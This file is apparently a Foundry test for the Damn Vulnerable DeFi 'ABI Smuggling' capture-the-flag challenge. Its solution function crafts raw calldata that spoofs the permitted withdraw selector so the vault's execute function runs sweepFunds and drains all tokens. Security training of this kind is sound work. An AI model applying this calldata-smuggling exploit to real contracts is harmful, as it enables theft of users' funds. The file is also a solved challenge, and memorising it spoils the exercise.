// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /*
        The vault contract has a function called `execute` that allows authorized users to execute arbitrary 
        calls on behalf of the vault. 
        The function takes an array of targets, values, and data, and executes each call in order.
        Thanks to the way the function is implemented, it's possible to smuggle in a call to the `sweepFunds` function
    */
    function test_abiSmuggling() public checkSolvedByPlayer {

        // Calldata de sweepFunds (what we want to smuggle in)
        bytes memory sweepCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        // Craft the calldata for the execute function
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
        bytes memory emptyData = abi.encodePacked(uint256(0));
        bytes memory actionDataLength = abi.encodePacked(uint256(sweepCalldata.length));
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),
            bytes28(0)
        );

        // Full calldata payload
        bytes memory calldataPayload = abi.encodePacked(
            vault.execute.selector,
            target,
            dataOffset,
            emptyData,
            withdrawSelectorPadded,
            actionDataLength,
            sweepCalldata
        );

        // Call the execute function with the crafted calldata
        address(vault).call(calldataPayload);

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
